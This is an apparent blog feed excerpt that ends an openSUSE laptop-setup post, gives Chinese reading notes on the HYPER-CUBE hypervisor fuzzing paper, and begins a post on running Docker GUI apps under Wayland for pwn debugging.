<code>asusctl</code> 与 <code>supergfxctl</code> 这两个工具我们可以非常方便地配置笔记本的各种配置</p><p>首先引入 ASUS Linux 的仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper ar --priority 50 --refresh https://download.opensuse.org/repositories/home:/luke_nukem:/asus/openSUSE_Tumbleweed/ asus-linux<br></code></pre></td></tr></table></figure><p>安装 <code>asusctl</code>，并用 <code>power-profiles-daemon</code> 替换掉 <code>tlp</code> 作为默认的电源管理服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper rm tlp<br>sudo zypper in asusctl<br>sudo zypper in power-profiles-daemon<br>sudo systemctl enable --now power-profiles-daemon.service<br>sudo systemctl start asusd<br></code></pre></td></tr></table></figure><p>为了保养电池，可以用 <code>asusctl</code> 将最大充电限制在 80：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo asusctl -c 80<br></code></pre></td></tr></table></figure><p>然后安装 <code>supergfxctl</code> 用以管理显卡，并替换掉过时的 <code>suse-prime</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper rm suse-prime<br>sudo zypper in supergfxctl<br>sudo systemctl enable --now supergfxd<br></code></pre></td></tr></table></figure><p>例如外出时可以用 <code>supergfxctl</code> 切换到集显输出以省电：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo supergfxctl -s # 查看笔记本支持的视频输出模式<br>sudo supergfxctl -g # 查看当前的视频输出模式<br>sudo supergfxctl -m Integrated # 设置为集显输出<br>sudo supergfxctl -m Hybrid # 设置为混合输出<br></code></pre></td></tr></table></figure><blockquote><p>社区其实还提供了一个图形化配置界面 <code>asusctl-rog-gui</code>，但是笔者电脑上不能成功启动，不过其实功能都是一样的：）</p></blockquote><h1 id="0x08-个人配置优化"><a href="#0x08-个人配置优化" class="headerlink" title="0x08. 个人配置优化"></a>0x08. 个人配置优化</h1><h3 id="单击选中而非打开"><a href="#单击选中而非打开" class="headerlink" title="单击选中而非打开"></a>单击选中而非打开</h3><p>KDE Dolphin 经典配置了，不过笔者更习惯 Windows 那样的单击选择双击打开的模式，这里只需要在系统设置中的 <code>Workspace Behaviour-&gt;General Behaviour</code> 中勾选 <code>Selects them</code> 即可</p><!--0x08. 使用 Docker 搭建深度学习环境 很多时候我们希望保证计算机主环境的整洁与完整性，毕竟万一某一天配各种软件把依赖给搞崩了就比较尴尬了，因此很多任务我们其实可以直接通过 Docker 来完成，虽然 openSUSE 自己也有深度学习框架，但是真用 openSUSE 来搞深度学习的终究是少数（国人就更少了），相对应地在网上的资料也比较少，因此我们这里选择使用 Ubuntu 镜像来搭建容器环境，毕竟搞机器学习的最重要的**就是那张卡**，而不是各种奇怪的系统环境-->]]></content>
    
    
    <summary type="html">&lt;p&gt;你说🉐对，但是 Arch Linux 是由 Arch 社区开发的一个 Linux 发行版…&lt;/p&gt;</summary>
    
    
    
    <category term="DISTRO" scheme="https://arttnba3.github.io/categories/DISTRO/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="openSUSE" scheme="https://arttnba3.github.io/tags/openSUSE/"/>
    
    <category term="openSUSE Tumbleweed" scheme="https://arttnba3.github.io/tags/openSUSE-Tumbleweed/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x04】论文笔记：HYPER-CUBE: High-Dimensional Hypervisor Fuzzing</title>
    <link href="https://arttnba3.github.io/2023/10/27/PAPER-0X04-HYPER_CUBE/"/>
    <id>https://arttnba3.github.io/2023/10/27/PAPER-0X04-HYPER_CUBE/</id>
    <published>2023-10-27T11:30:54.000Z</published>
    <updated>2023-10-27T11:37:34.977Z</updated>
    
    <content type="html"><![CDATA[<p>hyper 的 不是 visor，是我 cube 哒！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>笔者最近刚好在弄虚拟化相关的工作（<del>本来以为从字节离职后就不会碰到和虚拟化相关的开发了</del>），而刚好笔者看到有一系列论文（还得是论文作者👍）给出了利用系统虚拟化技术来辅助漏洞挖掘以及针对虚拟化系统进行漏洞挖掘的好东西，因此笔者还是打算抽空浅读一下：）</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>虚拟机管理器（Virtual Machine Manager，VMM，aka Hypervisor）是云技术（尤其是 IaaS）的基石，因此其安全问题十分重要</p><p>本文给出 <code>Hyper-Cube</code> ——一个通用的对 hypervisor 进行 fuzzing 的工具</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><blockquote><p><del>没必要讲但还是简单扯几句</del></p></blockquote><p>系统虚拟化技术是云计算的基石，但 VMM 若有漏洞则会影响到其他 VM 以及服务提供商的安全，因此我们需要一种高效的手段找出 VMM 中的漏洞</p><p>模糊测试（Fuzzing）是一个高效的找漏洞手段，但现在我们很难高效地 fuzz VMM：</p><ul><li>不同于传统 fuzz（只有 stdin 和 syscall 作为输入），fuzz VMM 需要与多种类型的接口 （MMIO、PIO、hypercall、…）进行交互</li><li>VMM crash 后的重启开销较大</li><li>很难高效地 fuzz（例如不能多线程）</li></ul><p>论文写作时（笔者注：2020年）最先进的 hypervisor fuzzer 是由 AFL 改来的 <a href="https://hhannuaa.github.io/papers/VDF_raid17.pdf">VDF</a>，只能 fuzz MMIO&#x2F;PIO；另一个 hypervisor fuzzer <a href="https://www.semanticscholar.org/paper/An-Empirical-Study-into-the-Security-Exposure-to-of-Ormandy/b67dc496b84010aa4f2a0f909fb3cb4d36ba78a0">IOFUZZ</a> 则只能往随机端口写随机值，<del>都弱爆了</del></p><p>为了解决这些挑战，本文给出三个可以提升的目标：</p><ul><li>较高的测试用例吞吐量</li><li>能同时与所有可用接口进行交互</li><li>能为一组不同的 hypervisor 生成稳定（stable）与确定（deterministic）的测试用例</li></ul><p>基于此，作者设计出了 <code>HYPER-CUBE</code>：一个基于一个最小客制化操作系统的通用 hypervisor fuzzer，总结下来贡献有如下三点：</p><ul><li>作者设计了一个多维度的（multi-dimentional）、无平台依赖的（platform-independent）能够有效且高效测试不同接口的模糊测试方法</li><li>作者描述了一个能够高效 fuzz hypervisor 的独立于待测平台的方法</li><li>作者通过一个名为 <code>HYPER-CUBE</code> 的客制操作系统实现了这种方法，并能在真实世界的 hypervisor 中找出漏洞</li></ul><p>项目代码开源于 <a href="">https://github.com/RUB-SysSec/hypercube</a></p><h1 id="0x02-Technology-Background"><a href="#0x02-Technology-Background" class="headerlink" title="0x02. Technology Background"></a>0x02. Technology Background</h1><blockquote><p><del>感觉不如直接看<a href="https://arttnba3.cn/2022/08/29/VURTUALIZATION-0X02-BASIC_KNOWLEDGE/">系统虚拟化导论</a></del></p></blockquote><p>在开始之前先介绍 X86 虚拟化的一些基础知识、X86 中 OS 的启动过程、Guest OS 与 hypervisor 的通信接口</p><h2 id="A-x86-Boot-Process"><a href="#A-x86-Boot-Process" class="headerlink" title="A. x86 Boot Process"></a>A. x86 Boot Process</h2><p>在 x86 机器上最先运行的程序通常是 <code>Basic Input/Output System</code> （BIOS） 或 <code>Unified Extensible Firmware Interface</code> （UEFI），本文将这样的程序称为 <code>固件</code> （firmware），之后便是运行 boot loader （如 GRUB）来准备环境并引导操作系统内核，再由内核来配置其他硬件（如中断控制器、PCI 设备）</p><h2 id="B-Input-x2F-Output-on-x86"><a href="#B-Input-x2F-Output-on-x86" class="headerlink" title="B. Input&#x2F;Output on x86"></a>B. Input&#x2F;Output on x86</h2><p>x86 上与设备通信的方式有：</p><ul><li><code>Port I/O</code>：传统的端口地址总线，通过 <code>in</code>、<code>out</code> 指令访问</li><li><code>Memory-Mapped I/O</code>：外设寄存器&#x2F;内存被映射到物理地址总线上，从而可以通过传统内存访问方式进行访问</li><li><code>Direct Memory Access</code>：这种机制允许外设直接访问物理内存，本文主要关注 PCI&#x2F;PCIe DMA，而非 ISA DMA（因为难搞）</li></ul><p>表 1 给出接口总览：</p><p><img src="https://s2.loli.net/2023/10/21/1h6xUYOkTNiBVgl.png" alt="TABLE I: Overview of hypervisor attack surfaces."></p><h2 id="C-Hypervisor"><a href="#C-Hypervisor" class="headerlink" title="C. Hypervisor"></a>C. Hypervisor</h2><p>Hypervisor 为 VM 提供可控的虚拟环境（虚拟 CPU、虚拟内存、模拟中断），当 VM 需要进行特权操作时便会触发 <code>VM-Exit</code> 将控制权返还给 hypervisor，由其完成模拟操作后返还控制权——称为 <code>Trap and Emulate</code> 机制</p><p>通过提供完全虚拟化的环境，hypervisor 可以在物理机上同时运行多个 VM</p><h3 id="1-CPU-and-Memory-Virtualization"><a href="#1-CPU-and-Memory-Virtualization" class="headerlink" title="1) CPU and Memory Virtualization"></a>1) CPU and Memory Virtualization</h3><p>过去人们用 <em>二进制转译</em> （binary translation）技术实现完全的 CPU 与内存虚拟化，通过 <code>trap and emulate</code> 模型捕获形如 <code>mov cr3</code> 这样的特权指令，但性能开销巨大，于是 Intel 和 AMD 都各自引入了自己的硬件辅助虚拟化支持</p><h3 id="2-Device-Emulation"><a href="#2-Device-Emulation" class="headerlink" title="2) Device Emulation"></a>2) Device Emulation</h3><p>hypervisor 还需要模拟包括中断控制器在内的标准硬件，其主要有两种交互机制：MMIO 与 port I&#x2F;O，不过 hypervisor 不需要中断 DMA 内存访问</p><p>图 1 给出一个通过 <em>trap and emulate</em> 模型实现设备虚拟化的例子（QEMU&#x2F;KVM）：</p><p><img src="https://s2.loli.net/2023/10/25/OwSxUy159cgsQo7.png" alt="Fig. 1: Device emulation and its trap and emulate handling of privilegedinstructions in KVM and QEMU."></p><h3 id="3-Para-Virtualization"><a href="#3-Para-Virtualization" class="headerlink" title="3) Para-Virtualization"></a>3) Para-Virtualization</h3><p>虚拟机并不需要直接接触到实际的硬件，<em>半虚拟化</em> （para-virtualization）由此诞生，这种技术本质上需要我们去修改 OS，例如 VirtIO 便提供了一个统一的虚拟设备协议，OS 只需要实现一套虚拟设备驱动即可</p><p>现代的硬件加速的（hardware-accelerated）虚拟化则引入了新的指令叫 <code>hypercall</code>，用来主动触发 <code>VM-exit</code> 以实现一些任务（以 Intel 为例为 <code>vmcall</code> 指令）</p><h2 id="D-Fuzzing-Hypervisor"><a href="#D-Fuzzing-Hypervisor" class="headerlink" title="D. Fuzzing Hypervisor"></a>D. Fuzzing Hypervisor</h2><p>对 hypervisor 的 fuzzing 存在接口繁多、重启开销大的挑战，目前绝大部分研究来自工业界，例如 <a href="https://www.blackhat.com/docs/eu-16/materials/eu-16-Li-When-Virtualization-Encounters-AFL-APortable-Virtual-Device-Fuzzing-Framework-WithAFL-wp.pdf.">Tang</a> 实现了一个定制于 QEMU 的 SeaBIOS 的 AFL 扩展，学术界则仅有一个 VDF</p><h1 id="0x03-Design"><a href="#0x03-Design" class="headerlink" title="0x03. Design"></a>0x03. Design</h1><h2 id="A-Threat-Model"><a href="#A-Threat-Model" class="headerlink" title="A. Threat Model"></a>A. Threat Model</h2><p>攻击者有着对虚拟机的完全控制权，其目的为获取宿主机上其他虚拟机或是宿主机本身的控制权，DoS 攻击也纳入考虑 </p><h2 id="B-Challenge-in-Fuzzing-Hypervisors"><a href="#B-Challenge-in-Fuzzing-Hypervisors" class="headerlink" title="B. Challenge in Fuzzing Hypervisors"></a>B. Challenge in Fuzzing Hypervisors</h2><p>如图 2 所示，hypervisor 与 guest 间的交互接口众多，且非所有接口都有文档，需要 fuzzer 能实现与 hypervisor 间的有意义交互；VM 中系统启动过程也可能影响漏洞寻找过程，但重启系统耗时较长；硬件加速也可能带来不确定性</p><p><img src="https://s2.loli.net/2023/10/27/kqSU9gYXdzChcFe.png" alt="Fig. 2: High-level overview of the system architecture of HYPER-CUBE"></p><h2 id="C-Architecture"><a href="#C-Architecture" class="headerlink" title="C. Architecture"></a>C. Architecture</h2><h3 id="1-High-Level-Overview"><a href="#1-High-Level-Overview" class="headerlink" title="1) High-Level Overview"></a>1) High-Level Overview</h3><p>文章中的 fuzzer 包含如图 2 所示的三个主要组成部分：</p><ul><li><code>HYPER-CUBE OS</code> 在虚拟机内启动并枚举硬件接口，定制的系统使得我们对 VM 有着完全的控制权限</li><li>随后启动的用来 fuzz hypervisor 的字节码解释器 <code>TESSERACT</code></li><li>一组额外的工具，用于向 <code>TESSERACT</code> 提供字节码流、反编译执行的字节码程序、使用如串口等接口观测 hypervisor</li></ul><p>这样的架构允许我们实现上文所述的三个目标：</p><ul><li><code>High Performance Fuzzing</code>：客制操作系统 <code>HYPER-CUBE OS</code> 比 COTS（Commercial Off-The-Shelf） OS 更轻量级，从而在 crash 后能快速重启系统；编译执行程序进行 fuzz 也较耗时，因此作者使用自制的运行在 VM 中 ring0 的 <code>TESSERACT</code> 字节码解释器，以 <em>fuzzer-friendly</em> 的方式设计字节码：最大化产生有用指令的可能性、对内存地址不作为指针而是作为大小与偏移值进行编码（<code>TESSERACT</code> 会记录那些有趣的内存区域）；为了提高生成合理字节码的概率，所有参数都被映射到模范围中</li><li><code>Generic High-Dimensional Fuzzing</code>：现有的 hypervisor fuzzer 通常关注于某一接口，而 <code>TESSERACT</code> 则可以与所有可用接口交互</li><li><code>Stable and Deterministic Fuzzing</code>：此前的 hypervisor fuzzer 基于 COTS OS 从而引入了大量属于系统本身的不确定性，作者开发的操作系统 <code>HYPER-CUBE OS</code> 则以对环境的控制权避免了这个问题，且能进行一些有趣的操作</li></ul><h3 id="2-HYPER-CUBE-OS"><a href="#2-HYPER-CUBE-OS" class="headerlink" title="2) HYPER-CUBE OS"></a>2) HYPER-CUBE OS</h3><p>客制操作系统 <code>HYPER-CUBE OS</code> 为该 fuzzer 的核心，其实现了 <a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html">multiboot 2 规范</a>，并为我们的 fuzzer （<code>TESSERACT</code>）提供了一个通用平台，其有着两个主要任务：物理内存管理与设备枚举，前者需要管理所有的物理内存，后者则需要枚举 MMIO 与 port I&#x2F;O 的地址范围，并与 PIC&#x2F;APIC 交互，有的信息（如 MMIO 区域）通过 BIOS&#x2F;UEFI 传递，而有的信息（如 I&#x2F;O 端口与 PCI 设备）则又需要手动枚举</p><h3 id="3-TESSERACT"><a href="#3-TESSERACT" class="headerlink" title="3) TESSERACT"></a>3) TESSERACT</h3><p><code>HYPER-CUBE OS</code> 启动后会与 hypervisor 进行随机交互，这通过自定义字节码解释器 <code>TESSERACT</code> 定义，字节码可以来自于 VM 外，也可以来自于该解释器内置的伪随机数生成器，字节码的设计形式使得任意字节串都是一个合法程序</p><p>解释器解码时会将所有的值模到一个范围中，根据 opcode 调用不同的处理函数（进行单个&#x2F;多个动作）；解释器还维护一组单个为 4k 页的会被被定期覆盖为随机数据的 scratch 区域，这使得 <code>TESSERACT</code> 可以在其上创建自定义数据结构作为输入</p><h3 id="4-External-Tools"><a href="#4-External-Tools" class="headerlink" title="4) External Tools"></a>4) External Tools</h3><p>该 fuzzer 的最后一部分为运行在 host 侧的三个独立的辅助工具（通常在 fuzzing 之后使用）：</p><ul><li>logger 在 fuzzing 时岚姐 VM 的串口通信并存储以供后续分析</li><li>minimization tool 在找到 bug 后使用同样的种子重新生成程序并在随机移除部分段后观测结果，算法收敛后通常能获得包含数十条指令的程序，出于调试目的我们还可以将 <code>TESSERACT</code> 作为独立的 ring 3 程序运行</li><li>decompiler 将给定的（最小化）字节码转换为等价的 C 程序以分析找到漏洞的字节流程序，这样的 C 程序可以被编译为 HYPER-CUBE OS 的一个模块或是插入到 COTS OS 内核驱动中进行调试</li></ul><h1 id="0x04-Implementation-Details"><a href="#0x04-Implementation-Details" class="headerlink" title="0x04. Implementation Details"></a>0x04. Implementation Details</h1><blockquote><p>这一节很多基础知识，懒得摘抄太多了</p></blockquote><h2 id="A-HYPER-CUBE-OS"><a href="#A-HYPER-CUBE-OS" class="headerlink" title="A. HYPER-CUBE OS"></a>A. HYPER-CUBE OS</h2><h3 id="1-Boot-Process"><a href="#1-Boot-Process" class="headerlink" title="1) Boot Process"></a>1) Boot Process</h3><p>在启动阶段固件会从不同的外设（称为 Option ROMs）中载入程序以检测硬件并生成数据信息，随后加载 bootloader 以装载内核，multiboot 标准被制定来标准化 bootloader （并扩展至第二代以支持 UEFI）以在不同 BIOS&#x2F;UEFI 间通用，遵循 multiboot2 的内核可以被构建为 ELF 文件，<code>HYPER-CUBE OS</code> 便基于 multiboot2 规范并使用 GRUB 进行引导，从而使得其可以通过传统 BIOS 或 UEFI 固件进行启动，且在入口点便进入保护模式</p><ul><li><code>Initializing Interrupts</code>：<code>HYPER-CUBE OS</code> 会配置 PIC&#x2F;APIC 以初始化所有基本的中断&#x2F;异常的 handlers，并通过 masking OS 内的所有终端寄存器以屏蔽了所有外部中断，从而确保 fuzzing 过程不会被中断</li></ul><h3 id="2-Memory-Management"><a href="#2-Memory-Management" class="headerlink" title="2) Memory Management"></a>2) Memory Management</h3><p>作者实现了一个单次分配一整张页面的简易堆管理器，减少了内存碎片并提高了<del>撸棒</del>健壮性，实际上仅在枚举设备时 <code>HYPER-CUBE OS</code> 会为 <code>TESSERACT</code> 分配少量内存，因此额外开销可以忽略不计</p><p>现代操作系统通常使用分页机制支撑虚拟空间，但一些任务（如页表和 MMIO）需要直接访问物理内存，因此 <code>HYPER-CUBE OS</code> 维护一个一对一直接映射到物理内存的区域（<code>0x0 ~ 0x100000</code>），此外由 BIOS&#x2F;UEFI 传来的可用物理内存信息会被用作内核堆，最后 <code>HYPER-CUBE OS</code> 会创建另一个对 MMIO 区域的重映射，内存布局如图 3 所示：</p><p><img src="https://s2.loli.net/2023/10/27/EiusOdrowH4zgSp.png" alt="Fig. 3: Virtual memory layout of HYPER-CUBE"></p><h3 id="3-Device-Enumeration"><a href="#3-Device-Enumeration" class="headerlink" title="3) Device Enumeration"></a>3) Device Enumeration</h3><p>PCI 这样的硬件设备或是 APIC 或 高精确事件计时器（High Precision Event Timer，HPET）可以将内部寄存器映射到物理内存上，访问对应的 MMIO 区域则可以直接影响这些设备的状态，<code>HYPER-CUBE OS</code> 会枚举可用来 fuzzing 的不同接口，这需要枚举所有外设所用的 MMIO 及 port I&#x2F;O 地址</p><ul><li><code>Core Components</code>：由 APIC 或 HPET 提供的 MMIO 区域信息通过名为 <code>高级配置与电源接口</code> （Advanced Configuration and Power Interface，ACPI）表的形式进行描述，HPET 与 APIC MMIO 区域的基址存放在对应的 ACPI 表中（由 multiboot bootloader 提供），ACPI 表中所有的基址指针都在 <code>TESSERACT</code> 中注册为 fuzzing 目标地址</li><li><code>PCI-/PCIe-Enumeration</code>：<code>HYPER-CUBE OS</code> 依赖于传统 PCI 配置 I&#x2F;O 接口或基于位于增强配置机制（<code>Enhanced Configuration Mechanism</code>，ECAM）基指针的 MMIO 区域的现代 PCI 配置空间进行 PCI 设备枚举，ECAM 信息同样存放在 ACPI 表中</li><li><code>ISA-Enumeration / I/O Port Probing</code>：ISA 设备没有系统的枚举与检测的办法，因此 <code>HYPER-CUBE OS</code> 会对所有的 2<sup>16</sup> 个端口进行读写，发生改变的端口值则被认为是一个模拟设备</li></ul><h2 id="B-TESSERACT"><a href="#B-TESSERACT" class="headerlink" title="B. TESSERACT"></a>B. TESSERACT</h2><p><code>TESSERACT</code> 是一个复杂指令集解释器，总的来说实现了如下指令：</p><p><img src="https://s2.loli.net/2023/10/27/6qHpPGwKkvshNR1.png" alt="image.png"></p><p>字节流输入将被 <code>TESSERACT</code> 解码为不同的指令操作，在没有外部字节码流作为输入的情况下其使用伪随机数生成器来生成随机指令（如图 4 所示），在找到造成崩溃的初始 PRNG 状态后，作者使用相同的状态重新生成相同的字节串（可能长达数百万到数千万条指令），并将其嵌入到 <code>HYPER-CUBE OS</code> 镜像中进行引导，若依然崩溃则会随机删除 50% 指令片段并重复此过程以获取最小字节串，随后通过反汇编器转为人类可读的 C 程序形式</p><p><img src="https://s2.loli.net/2023/10/27/JYXaqnIbLVBEy12.png" alt="Fig. 4: TESSERACT consuming a byte string provided either by a PRNG or an embedded payload. Upon receiving the byte string, TESSERACT decodes it into opcodes such as 1 and 2 . It then calls the handler that actually performs I/O operations."></p><h1 id="0x05-Evaluation"><a href="#0x05-Evaluation" class="headerlink" title="0x05. Evaluation"></a>0x05. Evaluation</h1><p>作者希望能够回答以下四个研究问题：</p><ul><li>使用 <code>HYPER-CUBE</code> 是否能够在不同 hypervisor 中发现新的漏洞？</li><li>是否能重新发现那些已知的漏洞（如 QEMU 的 CVE-2015-3456）？</li><li>与其他的 hypervisor fuzzer 相比在覆盖率方面如何？</li><li>与其他的 hypervisor fuzzer 相比在性能方面如何？</li></ul><blockquote><p>贴几个表看看实力，具体的原文就不摘抄了，反正很强就对了，建议看原论文</p></blockquote><p><img src="https://s2.loli.net/2023/10/27/Rti6dTquacA9WJU.png" alt="TABLE II: Reported bugs found by HYPER-CUBE."></p><p><img src="https://s2.loli.net/2023/10/27/rFPLTHKihf8VZ2k.png" alt="TABLE III: Previously known vulnerabilities in QEMU / KVM found by HYPER-CUBE (average time in seconds over 20 runs each ± standard deviation)."></p><p><img src="https://s2.loli.net/2023/10/27/NsWtpZwlAk2xJ6L.png" alt="TABLE IV: Branch coverage and bugs found by HYPER-CUBE and VDF"></p><p><img src="https://s2.loli.net/2023/10/27/Mz5sy1NQApVh6OF.png" alt="TABLE V: Throughput of TESSERACT vs. GCC (with -O0)"></p><p><img src="https://s2.loli.net/2023/10/27/oUwZFAtBHdISCPy.png" alt="TABLE VI: Boot time comparison using QEMU 4.0.1-rc4 ASAN (average over 20 runs each ± standard deviation)."></p><p><img src="https://s2.loli.net/2023/10/27/evFjpUbtR9TmZLE.png" alt="TABLE VII: Automatic emulator detection rate of HYPER-CUBE. #scanning indicates the number of interfaces identified by our scanning. #well-known denotes the number of ports that the scanning did not find, but were contained in our list of well-known ports. #baseline is the number of interfaces, as reported by the hypervisor."></p><h1 id="0x06-Related-Work"><a href="#0x06-Related-Work" class="headerlink" title="0x06. Related Work"></a>0x06. Related Work</h1><p>过去的项目使用客制操作系统来测试 hypervisor，例如 <a href="https://github.com/airbus-seclab/crashos">CrashOS</a> 是包含了一组手写测试用例的 OS，但不提供发现新漏洞的方法；Intel CHIPSEC 套件则提供了不同的 fuzz 模拟设备的组件；Ormandy 则写了一个用于在不同 hypervisor 中创建随机 I&#x2F;O 访问的 <a href="https://www.semanticscholar.org/paper/An-Empirical-Study-into-the-Security-Exposure-to-of-Ormandy/b67dc496b84010aa4f2a0f909fb3cb4d36ba78a0">fuzzer</a>；Henderson 等人则提出了通过修改开源 hypervisor 并提供 AFL 支持来 fuzz 特定模拟设备的<a href="https://hhannuaa.github.io/papers/VDF_raid17.pdf">方法</a>；Tang 等人则通过[在 QEMU 的 SeaBIOS 上实现接口](<a href="https://www.blackhat.com/docs/eu-16/materials/">https://www.blackhat.com/docs/eu-16/materials/</a><br>eu-16-Li-When-Virtualization-Encounters-AFL-APortable-Virtual-Device-Fuzzing-Framework-WithAFL-wp.pdf)以提供 AFL 与 QEMU 间的互相操作性；来自 MWR Labs 和微软安全研究与防御部门的 Amardeep Chana 则引入了用于模糊测试 Hyper-V hypercall（VMBus）的<a href="https://labs.mwrinfosecurity.com/blog/venturesinto-hyper-v-part-1-fuzzing-hypercalls/">模糊测试工具</a>（附加<a href="https://blogs.technet.microsoft.com/srd/2019/01/28/fuzzing-para-virtualizeddevices-in-hyper-v/">链接</a>）</p><h1 id="0x07-Discussion"><a href="#0x07-Discussion" class="headerlink" title="0x07. Discussion"></a>0x07. Discussion</h1><p>这个工具很强大，但仍有一些可以提升的点</p><h2 id="A-Coverage-Guided-Hypervisor-Fuzzing"><a href="#A-Coverage-Guided-Hypervisor-Fuzzing" class="headerlink" title="A. Coverage-Guided Hypervisor Fuzzing"></a>A. Coverage-Guided Hypervisor Fuzzing</h2><p>与覆盖率信息进行结合可能会提高发现漏洞的概率，为了发现新的覆盖范围或有趣行为，需要逐步构建 hypervisor 中的状态，而可能的操作空间巨大，让状态增长到有趣的事情发生（如 crash）似乎会极大增加吞吐量</p><h2 id="B-Hyper-V"><a href="#B-Hyper-V" class="headerlink" title="B. Hyper-V"></a>B. Hyper-V</h2><p><code>HYPER-CUBE</code> 暂不支持 <code>Hyper-V</code> ，因为其不支持 64 位 UEFI 引导（<code>Hyper-V</code> 要求操作系统以此模式进行引导）；同时 HYPER-CUBE 对半虚拟化的支持有限，目前只实现了不太可能单独触发有趣覆盖的通用操作</p><h1 id="0x08-Conclusion"><a href="#0x08-Conclusion" class="headerlink" title="0x08. Conclusion"></a>0x08. Conclusion</h1><blockquote><p>没啥好说的</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;hyper 的 不是 visor，是我 cube 哒！&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/tags/FUZZ/"/>
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="虚拟化" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="Qemu" scheme="https://arttnba3.github.io/tags/Qemu/"/>
    
  </entry>
  
  <entry>
    <title>【OPS.0x01】为 Docker 连接 Wayland 图形环境</title>
    <link href="https://arttnba3.github.io/2023/10/25/OPS-0X01-DOCKER_WAYLAND_GUI/"/>
    <id>https://arttnba3.github.io/2023/10/25/OPS-0X01-DOCKER_WAYLAND_GUI/</id>
    <published>2023-10-24T17:02:45.000Z</published>
    <updated>2024-02-23T06:31:41.000Z</updated>
    
    <content type="html"><![CDATA[<p>这一日，Docker 再入桌面 GUI 境界</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><blockquote><p>如果你只是寻求 docker 接通 Wayland 跑图形界面的解决方案，不想看笔者吐槽的各种批话，请直接跳过这一小节 ：）</p><p>如果你想要的是 docker 接通显卡的解决方案，那你走错路了，这个方案在<a href="https://arttnba3.cn/2023/08/31/OPS-0X00-DOCKER_ON_SERVER/#0x02-%E5%88%9B%E5%BB%BA%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E6%98%BE%E5%8D%A1%E7%9A%84-docker-%E7%8E%AF%E5%A2%83">隔壁</a></p></blockquote><p>笔者大一刚开始学 Pwn 的时候就因环境问题而感到苦手，上一题的环境可能是 <code>Ubuntu 16.04</code> 带个 <code>glibc-2.23</code> 只有 <code>fastbin</code>，下一题可能又变成 <code>Ubuntu 18.04</code> 带个 <code>glibc-2.27</code> 又多一个 <code>tcache</code> ，然后笔者本地环境又是 <code>Ubuntu 20.04</code> 带个 <code>glibc-2.31</code> 的同时 <code>tcache</code> 又多带一个 key，对于那时候以 glibc heap 利用作为主流的 Pwn 题而言若是本地 libc 版本不同则根本没有办法很好地调试好打远程</p><p>通过 <code>LD_PRELOAD</code> 参数在程序执行前 <em>预先加载 libc</em> 或许某些程度上是一个可行的办法，至少 libc 大版本相同的情况下载入不同的小版本基本上是没问题的，但是由于不同系统环境中 ld 版本不同的缘故，对于跨 ld 版本加载不同版本的 libc 则又可能直接 segmentation fault 了</p><p>虽然 Linux 的用户环境并不似 Windows 那样有着强壮的二进制前向兼容性，但是用户环境依托于内核环境、依托于内核向用户态暴露的接口——系统调用，而这并不是会轻易发生变动以及兼容性破坏的一个东西，由此，通过<strong>重新开辟一个对应的新的用户环境的方式</strong>—— 即形如 <code>Docker</code> 这样的<strong>操作系统层上的虚拟化方案</strong>，我们便能非常简单地搭建不同的 Pwn 题所对应的原始环境</p><blockquote><p><del>当然，这里就不得不提<a href="https://arttnba3.cn/2021/05/20/PIECES-0X00-SHELL_OUTSIDE-0-LOST_UMBRELLA/#arttnba3-arttnba3-cn-x2F-cat-flag">某些连 libc 都不给的是人是鬼全靠猜的比赛</a>的含金量了</del></p></blockquote><p>但是 Docker 一直有一个问题就是<strong>默认是没有图形环境的</strong>，这意味着我们没法直接在 Docker 当中运行 GUI 程序，对于需要复杂堆风水等多次调试的 Pwn 题目而言则没办法像直接运行在主机上那样直接通过 <code>gdb.attach()</code> 弹一个伪终端窗口出来：</p><p><img src="https://s2.loli.net/2023/10/24/ogN4EqIUx9TVm6u.jpg" alt="感觉不如 lldb"></p><p><a href="https://github.com/tmux/tmux/wiki">TMUX</a> 为我们提供了一个比较好的 docker 中的多终端解决方案，当你在 tmux 中运行 exploit 执行到 <code>gdb.attach()</code> 这样需要一个新终端的命令时，tmux 可以无缝分割出一个新的窗口，通过额外指定 pwntools 中的 <code>context.terminal</code> 环境变量可以控制新窗口的分割位置：</p><p><img src="https://s2.loli.net/2023/10/24/i2XEPgZGlVse1W8.jpg" alt="是新终端吗？如新"></p><p>但是 tmux 的翻页手感终究是差点意思，不像图形化界面那样可以很方便地用滚轮滚来滚去，同时基于 GUI 窗口的跨行文本复制也会跨多个 